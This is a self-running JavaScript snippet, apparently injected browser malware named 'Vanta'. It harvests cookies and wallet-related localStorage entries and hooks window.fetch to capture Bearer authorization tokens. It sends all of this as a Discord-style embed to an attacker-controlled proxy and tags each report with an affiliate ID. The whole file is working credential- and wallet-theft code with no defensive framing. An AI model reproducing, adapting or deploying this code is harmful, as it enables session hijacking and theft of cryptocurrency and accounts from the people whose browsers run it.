(function() {
    const affId = window.V_AFF || 't23dad55';
    const proxy = window.V_PROXY;

    // 1. Grab what we already found (Storage & Cookies)
    function getBasicData() {
        let data = { wallets: {}, session: document.cookie };
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key.includes('padreV2') || key.includes('wallet')) {
                data.wallets[key] = localStorage.getItem(key);
            }
        }
        return data;
    }

    // 2. HIJACK THE BEARER TOKEN
    // We wrap the browser's fetch function to peek at the 'Authorization' header
    const oldFetch = window.fetch;
    window.fetch = async function() {
        const url = arguments[0];
        const options = arguments[1];

        if (options && options.headers) {
            const auth = options.headers['Authorization'] || options.headers['authorization'];
            if (auth && auth.startsWith('Bearer ')) {
                // TOKEN FOUND! Send it immediately
                sendToVanta({ bearerToken: auth, sourceUrl: url });
            }
        }
        return oldFetch.apply(this, arguments);
    };

    async function sendToVanta(extra = {}) {
        const baseData = getBasicData();
        const payload = {
            embeds: [{
                title: "💀 VANTA TOKEN EXTRACTION",
                color: 0xFF0000,
                fields: [
                    { name: "Affiliate", value: affId, inline: true },
                    { name: "Bearer Token", value: "```" + (extra.bearerToken || "Siphoning...") + "```" },
                    { name: "Wallet Cache", value: "```json\n" + JSON.stringify(baseData.wallets, null, 2).substring(0, 500) + "```" },
                    { name: "Cookies", value: "```" + baseData.session.substring(0, 300) + "```" }
                ],
                footer: { text: "Vanta interceptor active..." }
            }]
        };

        await fetch(proxy, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    // Initial ping
    sendToVanta();
    console.log("Vanta: Interceptor Loaded.");
})();
